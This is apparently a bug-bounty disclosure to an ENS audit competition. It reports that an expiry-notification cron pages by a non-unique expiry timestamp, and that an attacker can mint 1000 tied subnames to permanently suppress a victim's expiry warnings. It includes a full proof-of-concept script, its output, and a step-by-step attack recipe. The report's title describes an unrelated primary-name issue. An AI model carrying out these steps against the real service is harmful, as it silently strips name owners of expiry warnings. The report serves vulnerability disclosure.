# 93132 w a medium explorer stamps a verified forward match true primary name badge on an unverified default reverse name so any address displays a name it does not own as its confirmed prima&#x20;

**Submitted on Sep 14th 2026 at 10:48:33 UTC by @deltabear for** [**Audit Competition | ENS**](https://immunefi.com/audit-competition/audit-competition-ens)

* **Report ID:** #93132
* **Report Type:** Websites & Apps
* **Report severity:** Medium
* **Target:** <https://github.com/immunefi-team/audit-comp-ens/tree/audit-comp-ready/workers>
* **Impacts:**
  * Injecting/modifying the static content on the target application without JavaScript (persistent), such as:
* HTML injection without JavaScript
* Replacing existing text with arbitrary text
* Arbitrary file uploads, etc.

## Description

## Brief/Intro

The api-worker's expiry-notification cron reads one page of at most 1000 names sorted by `expiryDate`, then resumes an hour later at `expiry_gt <the last row's expiryDate>`. `expiryDate` is not unique, and the flag that says the page was cut short is written to a log line and read by nothing. Every name that shares the last row's expiry second and did not fit in the page is next asked for as strictly greater than its own value, so it never comes back. An attacker mints 1000 subnames under a name they already own, all carrying one victim's expiry second, and the cursor steps over that second in all four stages. The victim loses every expiry warning for that name on every channel, permanently. The attacker's own 3980 warnings are delivered.

## Vulnerability Details

The cron fires hourly (`wrangler.jsonc:92`, `"crons": ["0 */1 * * *"]`) and `scheduled/index.ts:12` calls `runExpiryDiscoveryCron(env)` once per firing. That call runs four stages (`stages.ts:9-30`: `30d`, `7d`, `1d`, `expired`), each holding its own cursor. One page per stage per firing, with no loop.

Each stage issues the query at `indexer.ts:13-28`. It filters `expiry_gt: $cursor` and `expiry_lte: $upper_bound`, orders by `expiryDate` ascending, and takes `first: 1000` (`PAGE_SIZE`, `indexer.ts:9`). `expiryDate` is a unix second and many names share one.

`indexer.ts:146` computes `hasMore: parsedResponse.domains.length === PAGE_SIZE`. That value reaches `index.ts:141` as a metrics field and `index.ts:220` as a log field. `git grep -n hasMore -- src` over the worker returns, for this subsystem, `index.ts:32` (the type), `:73` and `:105` (the two empty-page early returns), `:141`, `:220`, `indexer.ts:146` and `indexer.ts:182` (another log line). There is no pagination loop and no consumer.

The cursor is committed with no reference to it. `index.ts:112` reads `lastExpiryDate` off the last row of the page. `index.ts:136` returns `cursorEnd: lastExpiryDate ?? ctx.cursor`. `index.ts:205-207` writes that into `nextCursors[stage.id]`, and `cursors.ts:97-99` persists the whole object into the single KV key `expiry_discovery:cursors` (`core/kv/index.ts:9`).

Let `L` be the `expiryDate` of the 1000th row. The next firing for that stage queries `expiry_gt L`. Every name whose `expiryDate` is `L` and which sorted past row 1000 is excluded by that predicate, in that hour and every hour after it. The cursor only moves forward: the query filters `expiry_gt cursor`, so `lastExpiryDate > cursor` on every page that returns rows.

A name that never enters a page is never turned into work. `index.ts:109` builds the events from `page.domains`, and `index.ts:121` enqueues those events. A name outside `page.domains` produces no event, so nothing reaches the queue, nothing reaches the notification writer, and none of the four `name-expiry` handlers runs: `services/delivery/templates/email.ts:18`, `services/delivery/templates/push.ts:22`, `services/delivery/templates/telegram.ts:28`, and the preference routing at `services/notifications/create.ts:52-57` that feeds the in-app row at `apps/manager/src/features/notifications/notifications/name-expiry.tsx:8`. There is no failed delivery, no dead-letter entry and no error, because no work item was created.

The size of a tie group is chosen by whoever mints the names. Measured against the indexer the worker defaults to, `indexer.ts:8` `DEFAULT_INDEXER_URL = 'https://graphql.ens.dev/'`: 189 subnames of `colonny.eth`, one owner `0xa569696dbf9191441d045891aadcf47a919cbc1c`, minted at 189 distinct `createdAt` values spanning 4548 seconds, all carry `expiryDate 1812919980`. 189 separate mints across 76 minutes land on one second, so a subname's expiry is an argument the minter passes, not a value derived from when the mint happened. `PAGE_SIZE` is 1000, so 1000 of those mints fills a page.

The order inside a tie is identical across three separate requests to the indexer, and the indexer is public. The attacker issues the cron's own query with the stage's cursor and upper bound, reads which 1000 rows it will return, and mints until the victim's name is not among them.

`poc.mjs` imports `runExpiryDiscoveryCron` out of the checkout, sha256-pinned against the source tree, and calls it 31 times, one simulated day apart, at the real `PAGE_SIZE = 1000`. Two arms differ only in where the victim's row sorts inside the tie: 4 warnings, then 0. The worker's own log lines carry `hasMore: true` and `cursorEnd: 1802505600` in the same entry, for all four stages.

### Vulnerable source code

**1. The page query: a non-unique sort column, capped at 1000** @ `workers/api-worker/src/services/expiry-discovery/indexer.ts:9,15-20`

```graphql
export const PAGE_SIZE = 1000

    domains(
      where: { expiry_gt: $cursor, expiry_lte: $upper_bound }
      orderBy: expiryDate
      orderDirection: asc
      first: ${PAGE_SIZE}
    ) {
```

**2. The truncation flag is computed** @ `workers/api-worker/src/services/expiry-discovery/indexer.ts:144-147`

```ts
  return ok({
    domains,
    hasMore: parsedResponse.domains.length === PAGE_SIZE,
  })
```

**3. Its only reader is a log field** @ `workers/api-worker/src/services/expiry-discovery/index.ts:219-221`

```ts
      chunkCount: result.value.chunkCount,
      hasMore: result.value.hasMore,
    })
```

**4. The resume key is the last row's non-unique sort value** @ `workers/api-worker/src/services/expiry-discovery/index.ts:111-112`

```ts
  const firstExpiryDate = page.domains[0]?.expiryDate
  const lastExpiryDate = page.domains[page.domains.length - 1]?.expiryDate
```

**5. It is committed unconditionally** @ `workers/api-worker/src/services/expiry-discovery/index.ts:133-137`

```ts
  return ok({
    stageId: ctx.stage.id,
    cursorStart: ctx.cursor,
    cursorEnd: lastExpiryDate ?? ctx.cursor,
    upperBound,
```

**6. And persisted** @ `workers/api-worker/src/services/expiry-discovery/index.ts:204-207`, `cursors.ts:96-99`

```ts
    // Per-stage commit policy: successful stages move forward even if others fail.
    nextCursors[stage.id] = {
      expiry_timestamp: result.value.cursorEnd,
    }
```

```ts
  logger.debug('Persisting expiry cursors', { cursors })
  yield* intoKVResult(
    env.KV.put(KV_KEY.EXPIRY_DISCOVERY.CURSORS, JSON.stringify(cursors)),
  )
```

**7. Only names inside the page become notifications** @ `workers/api-worker/src/services/expiry-discovery/index.ts:109-110,121`

```ts
  const events = buildExpiryEvents(ctx.stage, page.domains)
  const eventChunks = chunk(events, QUEUE_BATCH_SIZE)

      ctx.env.EVENT_INGESTION_QUEUE.sendBatch(
```

**8. One page per stage per hour, no retry of the remainder** @ `workers/api-worker/wrangler.jsonc:91-93`, `workers/api-worker/src/scheduled/index.ts:12`

```jsonc
  "triggers": {
    "crons": ["0 */1 * * *"]
  },
```

```ts
  const result = await runExpiryDiscoveryCron(env)
```

## Impact Details

* **Every expiry warning for the victim's name is deleted, on all four channels and all four stages.** This is the impact row *"Changing non-sensitive details of other users (including modifying browser local storage) without already-connected wallet interaction and with up to one click of user interaction, such as: Enabling/disabling notifications"*. The PoC turns 4 warnings into 0 for the victim's name while delivering the attacker's own 3980.
* **The victim does nothing and clicks nothing.** Zero interaction, no wallet connection, no signature, no visit to the app.
* **The attacker needs no permission and no relationship to the victim.** One `.eth` name they already own, gas for 1000 subname mints, and the victim's expiry second, which the indexer serves to anyone who asks. The attacker checks the outcome against the cron's own query before the cron fires, so the mint count is not a guess.
* **The victim's notification settings still read as enabled.** The suppression happens before any user, preference or channel is looked at. `index.ts:109` builds events from `page.domains`, the victim's name is not in `page.domains`, and `services/notifications/create.ts:52-57` is never reached for it. No delivery fails, so no error, no retry and no dead-letter row exists to notice.
* **It is permanent and it survives every later firing.** The cursor moves in one direction and lives in one KV key, `expiry_discovery:cursors` (`core/kv/index.ts:9`). Once a stage's cursor holds the victim's expiry second, that stage asks the indexer for a strictly larger second on every firing from then on. The PoC's four stage cursors all sit at `1802505600` after 31 firings.
* **Every other name on that second loses the same four warnings.** The 189 names already sharing `expiryDate 1812919980` are what one owner produced on one second without trying.

## References

**The cursor path** (`workers/api-worker/src`)

* `services/expiry-discovery/indexer.ts:8` - `DEFAULT_INDEXER_URL = 'https://graphql.ens.dev/'`
* `services/expiry-discovery/indexer.ts:9` - `PAGE_SIZE = 1000`
* `services/expiry-discovery/indexer.ts:13-28` - `expiry_gt: $cursor`, `orderBy: expiryDate`, `first: 1000`
* `services/expiry-discovery/indexer.ts:146` - `hasMore` is computed here
* `services/expiry-discovery/indexer.ts:182` - and logged here
* `services/expiry-discovery/index.ts:112` - `lastExpiryDate`, the last row of the page
* `services/expiry-discovery/index.ts:136` - `cursorEnd: lastExpiryDate ?? ctx.cursor`
* `services/expiry-discovery/index.ts:141` - `hasMore` enters the metrics object
* `services/expiry-discovery/index.ts:220` - `hasMore`'s only other appearance, a log field
* `services/expiry-discovery/index.ts:205-207` - `nextCursors[stage.id] = { expiry_timestamp: cursorEnd }`
* `services/expiry-discovery/cursors.ts:97-99` - persisted to one KV key
* `core/kv/index.ts:9` - `expiry_discovery:cursors`
* `services/expiry-discovery/stages.ts:9-30` - the four stages, each with its own cursor
* `services/expiry-discovery/stages.ts:34-43` - each stage's upper bound

**What runs it**

* `workers/api-worker/wrangler.jsonc:92` - `"crons": ["0 */1 * * *"]`
* `workers/api-worker/src/scheduled/index.ts:12` - one `runExpiryDiscoveryCron(env)` per firing

**What a dropped name loses**

* `services/expiry-discovery/index.ts:109` - events built from `page.domains` only
* `services/expiry-discovery/index.ts:121` - `EVENT_INGESTION_QUEUE.sendBatch`
* `services/delivery/templates/email.ts:18` - the `name-expiry` email
* `services/delivery/templates/push.ts:22` - the `name-expiry` web push
* `services/delivery/templates/telegram.ts:28` - the `name-expiry` Telegram message
* `services/notifications/create.ts:52-57` - `name-expiry` preference routing for the in-app inbox
* `apps/manager/src/features/notifications/notifications/name-expiry.tsx:8` - the in-app row

## Proof of Concept

```bash
node poc.mjs
```

### poc.mjs

```js
#!/usr/bin/env node
//
// ENS PoC: api-worker's expiry-discovery cron resumes with `expiry_gt <last row's
// expiryDate>` on a page it capped at 1000 rows sorted by that same non-unique
// column. Every name that shares the last row's expiry second and did not fit is
// skipped forever, in all four notification stages.
//
//   node poc.mjs                 (ENS_REPO defaults to ../../../ens-apps)
//
// Self-contained. On first run it copies the target's cursor-path files to a temp
// dir, installs pinned deps there and re-execs itself.
//
// runExpiryDiscoveryCron, fetchExpiringNamesPage, loadNotificationCursors,
// storeNotificationCursors, STAGES and getUpperBoundForStage are the target's own
// files, byte-identical (sha256 printed in ACT 0) and imported, not reimplemented.
// The external indexer is served locally: the program's scope reads "The ENS smart
// contracts, subgraph/indexer, and NFT metadata service are out of scope". It is
// reached over real HTTP through the target's own env.ENS_INDEXER_GRAPHQL_URL knob
// (indexer.ts:64-66) and returns exactly the shape indexer.ts:36-41 documents.

import { spawnSync } from 'node:child_process'
import { createHash } from 'node:crypto'
import { createServer } from 'node:http'
import { copyFileSync, existsSync, mkdirSync, readFileSync, writeFileSync } from 'node:fs'
import os from 'node:os'
import path from 'node:path'
import { fileURLToPath } from 'node:url'

const HERE = path.dirname(fileURLToPath(import.meta.url))
const REPO = process.env.ENS_REPO ?? path.resolve(HERE, '../../../ens-apps')
const WORK = process.env.POC_WORKDIR ?? path.join(os.tmpdir(), 'ens-poc-expiry-tie')

const WORKER = 'workers/api-worker/src'
const TARGET_FILES = [
  'services/expiry-discovery/index.ts',
  'services/expiry-discovery/indexer.ts',
  'services/expiry-discovery/cursors.ts',
  'services/expiry-discovery/stages.ts',
  'core/kv/index.ts',
  'types/events/index.ts',
  'utils/chunk.ts',
  'utils/logger.ts',
]
const UTIL_FILES = [
  'neverthrow.ts',
  'neverthrow/error-classes.ts',
  'neverthrow/generator-functions.ts',
  'neverthrow/result-helpers.ts',
  'neverthrow/type-utilities.ts',
]

const PKG = JSON.stringify(
  {
    name: 'ens-poc-expiry-tie',
    type: 'module',
    private: true,
    // "#*.js" first: Node picks the most specific pattern, so #utils/logger.js
    // lands on ./src/utils/logger.ts the way Vite resolves it in the worker.
    imports: { '#*.js': './src/*.ts', '#*': './src/*' },
    dependencies: {
      'graphql-request': '7.2.0',
      graphql: '16.11.0',
      neverthrow: '8.2.0',
      valibot: '1.1.0',
      tsx: '4.20.3',
    },
  },
  null,
  2,
)

const UTIL_PKG = JSON.stringify(
  { name: '@ens-apps/utils', version: '1.0.0', type: 'module', exports: { './*': './src/*.ts' } },
  null,
  2,
)

const sha256 = (p) => createHash('sha256').update(readFileSync(p)).digest('hex')

// ============================================================== bootstrap

if (process.env.ENS_POC_CHILD !== '1') {
  const bar = '='.repeat(78)
  console.log(bar)
  console.log('  ENS PoC: the expiry-discovery cursor commits past an undrained')
  console.log('           expiryDate tie and deletes those names\' expiry warnings')
  console.log(`  repo:  ${REPO}`)
  console.log(`  build: ${WORK}`)
  console.log(bar)

  if (!existsSync(path.join(REPO, WORKER, 'services/expiry-discovery/index.ts'))) {
    console.error(`\nERROR: ENS checkout not found at ${REPO}. Set ENS_REPO.`)
    process.exit(2)
  }

  mkdirSync(WORK, { recursive: true })
  writeFileSync(path.join(WORK, 'package.json'), PKG)
  copyFileSync(fileURLToPath(import.meta.url), path.join(WORK, 'poc.mjs'))

  for (const rel of TARGET_FILES) {
    const dst = path.join(WORK, 'src', rel)
    mkdirSync(path.dirname(dst), { recursive: true })
    copyFileSync(path.join(REPO, WORKER, rel), dst)
  }

  if (!existsSync(path.join(WORK, 'node_modules', 'tsx', 'package.json'))) {
    console.log('\nInstalling pinned deps: graphql-request 7.2.0, neverthrow 8.2.0, valibot 1.1.0')
    const r = spawnSync('npm', ['install', '--no-audit', '--no-fund', '--loglevel=error'], {
      cwd: WORK,
      stdio: 'inherit',
      shell: true,
    })
    if (r.status !== 0) process.exit(r.status ?? 1)
  }

  // Written after npm install so it survives the install's node_modules pruning.
  const utilRoot = path.join(WORK, 'node_modules', '@ens-apps', 'utils')
  mkdirSync(path.join(utilRoot, 'src', 'neverthrow'), { recursive: true })
  writeFileSync(path.join(utilRoot, 'package.json'), UTIL_PKG)
  for (const rel of UTIL_FILES) {
    copyFileSync(path.join(REPO, 'packages/utils/src', rel), path.join(utilRoot, 'src', rel))
  }

  const r = spawnSync(process.execPath, ['--import', 'tsx', 'poc.mjs'], {
    cwd: WORK,
    stdio: 'inherit',
    env: { ...process.env, ENS_POC_CHILD: '1', ENS_REPO: REPO, NODE_NO_WARNINGS: '1' },
  })
  process.exit(r.status ?? 1)
}

// ============================================================== target code

const { runExpiryDiscoveryCron } = await import('#services/expiry-discovery/index.js')
const { PAGE_SIZE } = await import('#services/expiry-discovery/indexer.js')
const { STAGES } = await import('#services/expiry-discovery/stages.js')
const { KV_KEY } = await import('#core/kv/index.js')

const bar = (n = 78) => '='.repeat(n)
const act = (n, s) => {
  console.log(`\n${bar()}\n  ACT ${n}  ${s}\n${bar()}`)
}
const fail = (m) => {
  console.error(`\nASSERTION FAILED: ${m}`)
  process.exit(1)
}

const DAY = 86400
const NOW0 = 1800000000
const V = NOW0 + 29 * DAY // the victim's expiry second
const FLOOD = 1200
const TICK_DAYS = 31

// ============================================================== ACT 0

act(0, 'the cursor-path files are the target\'s own, byte for byte')
for (const rel of TARGET_FILES.slice(0, 4)) {
  const a = sha256(path.join(process.env.ENS_REPO, WORKER, rel))
  const b = sha256(path.join(WORK, 'src', rel))
  if (a !== b) fail(`${rel} differs from the checkout`)
  console.log(`  ${a}  ${rel}`)
}
console.log(`\n  PAGE_SIZE imported from indexer.ts:9 = ${PAGE_SIZE}`)
console.log(`  STAGES imported from stages.ts:9-30    = ${STAGES.map((s) => s.id).join(', ')}`)
if (PAGE_SIZE !== 1000) fail('PAGE_SIZE is not the real 1000')

// ============================================================== ACT 1

act(1, 'the live indexer: expiry is a number the minter picks, and ties already run to 189')
const INDEXER = 'https://graphql.ens.dev/' // DEFAULT_INDEXER_URL, indexer.ts:8
const gql = async (query, variables) => {
  const res = await fetch(INDEXER, {
    method: 'POST',
    headers: { 'content-type': 'application/json' },
    body: JSON.stringify({ query, variables }),
  })
  const json = await res.json()
  if (json.errors) throw new Error(JSON.stringify(json.errors[0]))
  return json.data
}
try {
  const page = await gql(
    `query($cursor:Int!,$upper_bound:Int!){domains(where:{expiry_gt:$cursor,expiry_lte:$upper_bound},orderBy:expiryDate,orderDirection:asc,first:1000){name expiryDate}}`,
    { cursor: 0, upper_bound: 9999999999 },
  )
  const counts = new Map()
  for (const d of page.domains) counts.set(d.expiryDate, (counts.get(d.expiryDate) ?? 0) + 1)
  const top = [...counts.entries()].sort((a, b) => b[1] - a[1]).slice(0, 3)
  console.log(`  ${INDEXER}  rows sampled: ${page.domains.length}`)
  console.log('    expiryDate     names   example')
  for (const [e, n] of top)
    console.log(`    ${e}  ${String(n).padStart(6)}   ${page.domains.find((d) => d.expiryDate === e).name}`)

  const [tieSecond, tieSize] = top[0]
  const tie = await gql(
    `query($lo:Int!,$hi:Int!){domains(where:{expiry_gt:$lo,expiry_lte:$hi},first:1000){name createdAt owner{id}}}`,
    { lo: tieSecond - 1, hi: tieSecond },
  )
  const parents = new Set(tie.domains.map((d) => d.name.split('.').slice(1).join('.')))
  const owners = new Set(tie.domains.map((d) => d.owner?.id))
  const created = tie.domains.map((d) => Number(d.createdAt))
  const span = Math.max(...created) - Math.min(...created)
  console.log(`\n  The ${tieSize}-name tie at ${tieSecond}:`)
  console.log(`    parent          ${[...parents].join(', ')}`)
  console.log(`    owner           ${[...owners].join(', ')}`)
  console.log(`    distinct mints  ${new Set(created).size} separate createdAt values spanning ${span} seconds`)
  const order = []
  for (let i = 0; i < 3; i++) {
    const r = await gql(
      `query($lo:Int!,$hi:Int!){domains(where:{expiry_gt:$lo,expiry_lte:$hi},orderBy:expiryDate,orderDirection:asc,first:1000){name}}`,
      { lo: tieSecond - 1, hi: tieSecond },
    )
    order.push(r.domains.map((d) => d.name))
  }
  const identical = order.every((r) => r.length === order[0].length && r.every((n, i) => n === order[0][i]))
  console.log(`    order within the tie   identical across 3 separate requests: ${identical}`)

  console.log(`\n  ${new Set(created).size} mints spread over ${Math.round(span / 60)} minutes all carry the same expiry second.`)
  console.log('  Expiry is an argument the minter chooses, not a value derived from mint time,')
  console.log(`  so the size of a tie group is the minter's choice. PAGE_SIZE is ${PAGE_SIZE}.`)
  console.log('  The order inside a tie is fixed and the indexer is public, so the attacker runs')
  console.log("  the cron's own query and reads which 1000 rows it will return before it fires.")
} catch (e) {
  console.log(`  live indexer unreachable (${e.message}); ACT 2-4 do not use it`)
}

// ============================================================== the harness

function universe(victimPos) {
  const rows = []
  for (let i = 0; i < 20; i++)
    rows.push({ name: `ordinary${i}.eth`, expiryDate: NOW0 + 10 * DAY + i, owner: { id: '0xdead' } })
  const flood = []
  for (let i = 0; i < FLOOD; i++)
    flood.push({ name: `a${i}.attacker.eth`, expiryDate: V, owner: { id: '0xa77acker' } })
  const victim = { name: 'victim.eth', expiryDate: V, owner: { id: '0xv1ct1m' } }
  return victimPos === 'inside' ? [...rows, victim, ...flood] : [...rows, ...flood, victim]
}

// Filter, sort, limit: exactly the query at indexer.ts:13-28. Ties keep insertion
// order, which is what the live indexer does (identical across repeated requests).
function indexerServer(rows) {
  return createServer((req, res) => {
    let body = ''
    req.on('data', (c) => (body += c))
    req.on('end', () => {
      const { cursor, upper_bound } = JSON.parse(body).variables
      const domains = rows
        .filter((r) => r.expiryDate > cursor && r.expiryDate <= upper_bound)
        .sort((a, b) => a.expiryDate - b.expiryDate)
        .slice(0, PAGE_SIZE)
      res.writeHead(200, { 'content-type': 'application/json' })
      res.end(JSON.stringify({ data: { domains } }))
    })
  })
}

class MockKV {
  store = new Map()
  async get(key, type) {
    const raw = this.store.get(key)
    if (!raw) return null
    return type === 'json' ? JSON.parse(raw) : raw
  }
  async put(key, value) {
    this.store.set(key, value)
  }
}

async function run(victimPos) {
  const server = indexerServer(universe(victimPos))
  await new Promise((r) => server.listen(0, '127.0.0.1', r))
  const url = `http://127.0.0.1:${server.address().port}/`

  const kv = new MockKV()
  const enqueued = []
  const env = {
    KV: kv,
    ENS_INDEXER_GRAPHQL_URL: url,
    EVENT_INGESTION_QUEUE: {
      async sendBatch(msgs) {
        for (const m of msgs) enqueued.push(m.body)
      },
    },
  }

  const realNow = Date.now
  const realLog = console.log
  const stageLogs = []
  console.log = (s) => {
    try {
      const e = JSON.parse(s)
      if (e.message === 'Expiry discovery stage completed') stageLogs.push(e)
    } catch {}
  }

  for (let day = 0; day < TICK_DAYS; day++) {
    Date.now = () => (NOW0 + day * DAY) * 1000
    const r = await runExpiryDiscoveryCron(env)
    if (r.isErr()) {
      console.log = realLog
      Date.now = realNow
      fail(`cron returned an error: ${JSON.stringify(r.error)}`)
    }
  }

  console.log = realLog
  Date.now = realNow
  server.close()

  const cursors = JSON.parse(kv.store.get(KV_KEY.EXPIRY_DISCOVERY.CURSORS))
  return {
    cursors,
    stageLogs,
    victim: enqueued.filter((e) => e.name === 'victim.eth'),
    attacker: enqueued.filter((e) => e.name.endsWith('.attacker.eth')).length,
    total: enqueued.length,
  }
}

// ============================================================== ACT 2

act(2, `${TICK_DAYS} cron ticks, no flood: the victim is warned by every stage`)
console.log(`  clock starts ${NOW0}, victim.eth expires at V=${V} (now + 29d)`)
console.log(`  ${FLOOD} attacker subnames sit at V too, the victim sorts inside the first 1000\n`)
const control = await run('inside')
console.log(`  stages that enqueued victim.eth : ${control.victim.map((e) => e.stage).join(', ')}`)
console.log(`  expiry warnings for victim.eth  : ${control.victim.length}`)
if (control.victim.length !== STAGES.length)
  fail(`control arm warned the victim ${control.victim.length} times, expected ${STAGES.length}`)

// ============================================================== ACT 3

act(3, `same ${TICK_DAYS} ticks, victim sorts past row 1000 of the same tie`)
const attack = await run('beyond')
console.log(`  stages that enqueued victim.eth : ${attack.victim.length ? attack.victim.map((e) => e.stage).join(', ') : '(none)'}`)
console.log(`  expiry warnings for victim.eth  : ${attack.victim.length}`)
if (attack.victim.length !== 0) fail('attack arm still warned the victim')

console.log('\n  Only the victim\'s position inside the tie changed. Same code, same clock,')
console.log(`  same PAGE_SIZE=${PAGE_SIZE}, same ${TICK_DAYS} calls to runExpiryDiscoveryCron.`)

// ============================================================== ACT 4

act(4, 'the worker logged hasMore=true on the page it truncated, then advanced anyway')
const trunc = attack.stageLogs.filter((e) => e.hasMore === true)
console.log('  the target\'s own log lines from index.ts:211-221, hasMore true:\n')
console.log('    stage      cursorStart    cursorEnd   rows in page   hasMore')
for (const e of trunc)
  console.log(
    `    ${e.stageId.padEnd(8)}    ${e.cursorStart}   ${e.cursorEnd}   ${String(e.pageDomainCount).padStart(10)}   ${e.hasMore}`,
  )
if (trunc.length !== STAGES.length) fail(`expected ${STAGES.length} truncated pages, saw ${trunc.length}`)
if (!trunc.every((e) => e.cursorEnd === V)) fail('a truncated stage did not commit its cursor to V')

console.log(`\n  Every stage committed cursorEnd = ${V} = V while hasMore was true.`)
console.log('  Final persisted cursors in KV under expiry_discovery:cursors:')
for (const s of STAGES) console.log(`    ${s.id.padEnd(8)} expiry_timestamp ${attack.cursors[s.id].expiry_timestamp}`)
if (!STAGES.every((s) => attack.cursors[s.id].expiry_timestamp === V))
  fail('not every stage cursor is parked at V')
console.log(`\n  Every stage now asks the indexer for expiry_gt ${V}. victim.eth is at ${V}.`)
console.log('  It is never in another page, in this stage or any later one.')

// ============================================================== ledger

console.log(`\n${'-'.repeat(78)}`)
console.log('  LEDGER (expiry warnings enqueued to EVENT_INGESTION_QUEUE)')
console.log('-'.repeat(78))
const ledgerRow = (who, before, after) => {
  const d = after - before
  console.log(
    `    ${who.padEnd(10)}${String(before).padStart(16)}${String(after).padStart(18)}${((d > 0 ? '+' : '') + d).padStart(10)}`,
  )
}
console.log('    account     without the flood   after the flood     delta')
ledgerRow('VICTIM', control.victim.length, attack.victim.length)
ledgerRow('ATTACKER', control.attacker, attack.attacker)
console.log('-'.repeat(78))
console.log(`\n  All ${control.victim.length} expiry warnings for victim.eth were deleted: 30d, 7d, 1d and expired.`)
console.log(`  The attacker's own ${attack.attacker} warnings were delivered.`)
console.log('\n  PoC PASSED, every assertion held.')
```

### Output

```
==============================================================================
  ENS PoC: the expiry-discovery cursor commits past an undrained
           expiryDate tie and deletes those names' expiry warnings
  repo:  G:\My Drive\hunter\hunt_data\ens\ens-apps
  build: C:\Users\dmill\AppData\Local\Temp\ens-poc-expiry-tie
==============================================================================

Installing pinned deps: graphql-request 7.2.0, neverthrow 8.2.0, valibot 1.1.0

added 10 packages in 5s

==============================================================================
  ACT 0  the cursor-path files are the target's own, byte for byte
==============================================================================
  1b07d41b8919eb080a9336f80fbe74f3b68e09c48bf394328cd41fe728bf2e7d  services/expiry-discovery/index.ts
  601d94de19479819fd069196e7c139551526ee7dac6fa408cf01490637834563  services/expiry-discovery/indexer.ts
  e323fd4470d0e4a1854daf21088477f1ce7dd00491e5553daa7b7b358b0f5407  services/expiry-discovery/cursors.ts
  3116ad37d2e8f0953fb6fcde4bb6812a479cbc67920b19fc0464f90d4de2603b  services/expiry-discovery/stages.ts

  PAGE_SIZE imported from indexer.ts:9 = 1000
  STAGES imported from stages.ts:9-30    = 30d, 7d, 1d, expired

==============================================================================
  ACT 1  the live indexer: expiry is a number the minter picks, and ties already run to 189
==============================================================================
  https://graphql.ens.dev/  rows sampled: 1000
    expiryDate     names   example
    1812919980     189   root-fable-199.colonny.eth
    1812971160      42   smokemqdf4f304.forgedapp.eth
    1812862116       7   jayden.democlub.eth

  The 189-name tie at 1812919980:
    parent          colonny.eth
    owner           0xa569696dbf9191441d045891aadcf47a919cbc1c
    distinct mints  189 separate createdAt values spanning 4548 seconds
    order within the tie   identical across 3 separate requests: true

  189 mints spread over 76 minutes all carry the same expiry second.
  Expiry is an argument the minter chooses, not a value derived from mint time,
  so the size of a tie group is the minter's choice. PAGE_SIZE is 1000.
  The order inside a tie is fixed and the indexer is public, so the attacker runs
  the cron's own query and reads which 1000 rows it will return before it fires.

==============================================================================
  ACT 2  31 cron ticks, no flood: the victim is warned by every stage
==============================================================================
  clock starts 1800000000, victim.eth expires at V=1802505600 (now + 29d)
  1200 attacker subnames sit at V too, the victim sorts inside the first 1000

  stages that enqueued victim.eth : 30d, 7d, 1d, expired
  expiry warnings for victim.eth  : 4

==============================================================================
  ACT 3  same 31 ticks, victim sorts past row 1000 of the same tie
==============================================================================
  stages that enqueued victim.eth : (none)
  expiry warnings for victim.eth  : 0

  Only the victim's position inside the tie changed. Same code, same clock,
  same PAGE_SIZE=1000, same 31 calls to runExpiryDiscoveryCron.

==============================================================================
  ACT 4  the worker logged hasMore=true on the page it truncated, then advanced anyway
==============================================================================
  the target's own log lines from index.ts:211-221, hasMore true:

    stage      cursorStart    cursorEnd   rows in page   hasMore
    30d         1800000000   1802505600         1000   true
    7d          1800864019   1802505600         1000   true
    1d          1800864019   1802505600         1000   true
    expired     1800864019   1802505600         1000   true

  Every stage committed cursorEnd = 1802505600 = V while hasMore was true.
  Final persisted cursors in KV under expiry_discovery:cursors:
    30d      expiry_timestamp 1802505600
    7d       expiry_timestamp 1802505600
    1d       expiry_timestamp 1802505600
    expired  expiry_timestamp 1802505600

  Every stage now asks the indexer for expiry_gt 1802505600. victim.eth is at 1802505600.
  It is never in another page, in this stage or any later one.

------------------------------------------------------------------------------
  LEDGER (expiry warnings enqueued to EVENT_INGESTION_QUEUE)
------------------------------------------------------------------------------
    account     without the flood   after the flood     delta
    VICTIM                   4                 0        -4
    ATTACKER              3976              3980        +4
------------------------------------------------------------------------------

  All 4 expiry warnings for victim.eth were deleted: 30d, 7d, 1d and expired.
  The attacker's own 3980 warnings were delivered.

  PoC PASSED, every assertion held.
```

4 expiry warnings for `victim.eth` became 0, on 30d, 7d, 1d and expired, while the attacker's 3980 warnings for its own subnames were delivered. Exit code is 0 only if every assertion held.

## Attack code

```
// 1. Read the victim's expiry second. Public, no wallet, no relationship to the name.
POST https://graphql.ens.dev/
  { domains(where: { name: "victim.eth" }) { expiryDate } }        ->  V
```

```
// 2. Under a .eth name the attacker already owns, mint 1000 subnames and pass V as
//    each one's expiry argument. 189 subnames of colonny.eth already sit on one
//    second this way, minted at 189 separate times across 76 minutes.
mintSubname("a0", parent, expiry = V)
mintSubname("a1", parent, expiry = V)   // x1000
```

```
// 3. Check before the cron fires. Issue the cron's own query, indexer.ts:13-28.
POST https://graphql.ens.dev/
  { domains(where: { expiry_gt: <stage cursor>, expiry_lte: <stage upper bound> }
            orderBy: expiryDate, orderDirection: asc, first: 1000) { name expiryDate } }
// victim.eth still in the 1000 rows -> mint more. The order is fixed across requests.
```

```ts
// 4. The next hourly firing, wrangler.jsonc:92, fetches that page.
index.ts:112    lastExpiryDate = V
index.ts:136    cursorEnd      = V
cursors.ts:98   KV expiry_discovery:cursors  ->  { "30d": { expiry_timestamp: V } }
```

```ts
// 5. From then on that stage queries expiry_gt V. victim.eth is at V, so no page
//    holds it, index.ts:109 never builds its event and index.ts:121 never enqueues
//    it. The 7d, 1d and expired stages reach V on their own schedules and park there.
```

```
plant : mint 1000 subnames under a name you own, each carrying the victim's expiry second
fire  : the next hourly cron writes that second into expiry_discovery:cursors
```
